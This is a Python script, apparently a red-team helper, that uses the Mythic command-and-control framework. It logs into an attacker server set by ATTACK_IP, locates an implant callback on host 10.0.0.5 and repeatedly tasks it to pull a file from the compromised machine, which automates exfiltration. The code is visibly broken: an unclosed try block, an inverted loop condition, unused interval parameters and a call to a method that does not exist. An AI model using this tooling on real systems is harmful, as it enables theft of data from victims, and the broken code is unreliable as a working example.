'''
 # @ Author: Newt Tan
 # @ Create Time: 2025-01-04 12:44:57
 # @ Modified by: Newt Tan
 # @ Modified time: 2025-01-04 12:46:37
 # @ Description: automatically send back extracted data
 '''


from mythic import Mythic
from dotenv import load_dotenv
from pathlib import Path
import os

dotenv_path = Path.cwd().joinpath('.env').as_posix()

load_dotenv(dotenv_path)

class MythicHelper:
    def __init__(self,):
        self.mythic = Mythic(username=os.environ.get("USERNAME"), password=os.environ.get("PASSWORD"), \
                             server_ip=os.environ.get("ATTACK_IP"))
        self.mythic.login()

    def locate_callback(self, match_key, match_value):
        ''' automatically locate the callback by matching specific key-value pairs

        :param match_key: attribute to match (e.g 'id' 'domain' 'ip')
        :param match_value: vlaue to match for the attribute
        :return: callback dictionary or None if not found
        
        '''
        callbacks = self.mythic.get_all_callbacks()
        for callback in callbacks:
            if callback.get(match_key) == match_value:
                print(f"Found callback: {callback}")
                return callback
        
        print(f"No callback matching {match_key} = {match_value} found.")
        return None


    def down_send_file(self, callback_id, file_path, min_interval=60, max_interval=7200):
        ''' periodically send a command to download a specific file from the target

        :param callback_id: Id of the callback to task
        :param file_path: Path to the file to download
        '''
        while True:
            try:
                task = self.mythic.create_task(callback_id, command="download", params=file_path)
                print(f"Task sent for downloading {file_path}. Task ID: {task['id']}")

                # monitor task results
                task_status = None
                while task_status in ["completed", 'error']:
                    task_info = self.mythic.get_task_status(task['id'])
                    task_status = task_info.get("status", "unknown")
                    print(f"Task {task['id']} status: {task_status}")

                    if task_status == "completed":
                        # save downloaded file
                        file_id = task_info['response'].get("file_id")
                        if file_id:
                            file_content = self.mythic.download_file(file_id)
                            with open(Path(file_path).name, 'wb') as fw:
                                fw.write(file_content)
                            print(f"File {file_path} successfully downloaded. ")
                        break
                    elif task_status == "error":
                        print()
                        break

if __name__ == "__main__":
    helper = MythicHelper()
    hostname = "10.0.0.5"
    # locate callback by hostname   
    callback = helper.locate_callback("host", hostname)
    if callback:
        callback_id = callback['id']
        # default saved location --- current folder
        file_path = Path.cwd().joinpath("system.json")
        helper.download_file_random_interval(callback_id, file_path, min_interval=120, max_interval=3600) 

